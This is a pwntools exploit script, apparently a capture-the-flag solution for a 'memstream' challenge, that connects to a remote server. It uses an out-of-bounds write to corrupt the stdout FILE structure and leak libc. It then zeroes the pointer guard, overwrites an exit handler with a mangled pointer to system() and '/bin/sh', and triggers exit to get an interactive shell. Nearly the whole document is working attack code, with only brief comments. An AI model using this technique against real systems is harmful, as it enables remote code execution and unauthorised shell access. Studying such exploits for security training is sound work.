from pwn import *
#io = process("./memstream",aslr=True)
io = remote("54.78.163.105",32453)
#io = remote("0.0.0.0",5000)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def seek(pos):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"Position:",str(pos).encode())

def write(size,data):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"Size:",str(size).encode())
    io.sendafter(b"Data:",data)


# this offset always changes across diff setups for some reason. its the offset between libc base and g_buf
# THIS offset: , is gotten using the docker container
offset = 0x26d060

# putting these values here to make calculations simpler
# don't need to know the exact address for these, just need to know the relative offset
g_buf     = 0x7ffff7ffb060
libcGuess = g_buf - offset 

stdout    = libcGuess + 0x21a780
tcb       = libcGuess - 0x28c0 
exit_func = libcGuess + 0x21af00


# overwrite stdout FILE flags to full buffering
seek(stdout-g_buf)
write(4,p32(0xfbad2887 | 0x1800))

# overwrite WRITE_END and get leaks
seek((stdout+0x28) - g_buf)
write(1,b"\xff")

libcBase = u64(io.recvuntil(b"Done")[6:12].ljust(8,b"\x00")) - 0x21ba70
system = libcBase+0x50d60
log.info("LIBC BASE: " + hex(libcBase))

# overwrite pointer guard
seek((tcb+0x30) - g_buf)
write(8,p64(0))

# overwrite exit_handlers
seek((exit_func+0x18) - g_buf)
write(8,p64(rol(system,0x11,64))) # overwrite mangled_ptr
seek((exit_func+0x20) - g_buf)

g_buf = libcBase + offset         # actually have to know the address of g_buf now 
write(8,p64(g_buf))               # overwrite arguments

# setup /bin/sh string
seek(0)
write(8,b"/bin/sh\x00")

# trigger exit
seek(-100000000)
io.sendlineafter(b">",b"3")
io.sendlineafter(b"Size:",b"1")

#gdb.attach(io,gdbscript="break *" + hex(libcBase+0x7fbb0))
io.interactive()
